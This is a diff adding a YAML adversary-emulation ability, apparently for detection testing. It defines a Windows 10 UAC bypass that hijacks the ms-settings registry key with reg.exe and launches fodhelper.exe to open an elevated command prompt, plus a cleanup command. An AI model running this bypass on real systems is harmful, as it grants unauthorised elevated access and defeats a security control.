@@ -1,0 +1,22 @@
+---
+- id: 0c328b7ec82e0074cbb0745db3a53602
+  name: Bypass UAC using Fodhelper
+  description: 'Bypasses User Account Control using the Windows 10 Features on Demand
+    Helper (fodhelper.exe). Requires Windows 10.
+
+    Upon execution, "The operation completed successfully." will be shown twice and
+    command prompt will be opened.
+
+    '
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      cmd:
+        command: reg.exe add hkcu\software\classes\ms-settings\shell\open\command
+          /ve /d "C:\Windows\System32\cmd.exe" /f && reg.exe add hkcu\software\classes\ms-settings\shell\open\command
+          /v "DelegateExecute" /f && fodhelper.exe
+        payloads: []
+        cleanup: reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
